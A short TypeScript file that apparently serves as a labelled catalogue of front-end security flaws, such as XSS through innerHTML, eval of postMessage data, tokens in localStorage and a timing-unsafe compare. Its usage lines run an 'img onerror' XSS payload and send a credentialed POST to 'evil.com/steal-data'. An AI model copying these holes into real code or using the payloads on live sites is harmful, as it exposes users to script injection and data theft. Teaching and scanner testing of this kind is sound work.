// Line 1: Cross-Site Scripting (XSS) vulnerability
function displayUserInput(input: string) {
    document.getElementById('output').innerHTML = input;
  }
  
  // Line 6: Insecure use of postMessage (vulnerability)
  window.addEventListener('message', (event) => {
    if (event.origin !== 'https://trusted-site.com') {
      return;
    }
    eval(event.data);
  });
  
  // Line 13: Clickjacking vulnerability (missing X-Frame-Options header)
  // This would typically be set on the server, but we're including it here for demonstration
  
  // Line 16: Cross-Site Request Forgery (CSRF) vulnerability
  function sendRequest(url: string) {
    fetch(url, { method: 'POST', credentials: 'include' });
  }
  
  // Line 21: Insecure storage of sensitive data (vulnerability)
  function saveToken(token: string) {
    localStorage.setItem('auth_token', token);
  }
  
  // Line 26: Insecure communication (vulnerability)
  function fetchData() {
    fetch('http://api.example.com/data')
      .then(response => response.json())
      .then(data => console.log(data));
  }
  
  // Line 33: Usage of a vulnerable library (assume jquery is outdated)
  declare const $: any;
  $('button').click(() => {
    // Some action
  });
  
  // Line 39: Insecure randomness (vulnerability)
  function generateInsecureRandomNumber() {
    return Math.floor(Math.random() * 1000000);
  }
  
  // Line 44: Timing attack vulnerability
  function insecureCompare(a: string, b: string) {
    if (a.length !== b.length) {
      return false;
    }
    for (let i = 0; i < a.length; i++) {
      if (a[i] !== b[i]) {
        return false;
      }
    }
    return true;
  }
  
  // Line 56: DOM-based XSS vulnerability
  function updatePage() {
    const name = new URLSearchParams(window.location.search).get('name');
    document.getElementById('greeting').innerHTML = `Hello, ${name}!`;
  }
  
  // Usage
  displayUserInput('<img src=x onerror=alert("XSS")>');
  sendRequest('https://evil.com/steal-data');
  saveToken('sensitive_token_value');
  fetchData();
  generateInsecureRandomNumber();
  insecureCompare('secret', 'guess');
  updatePage();
  
  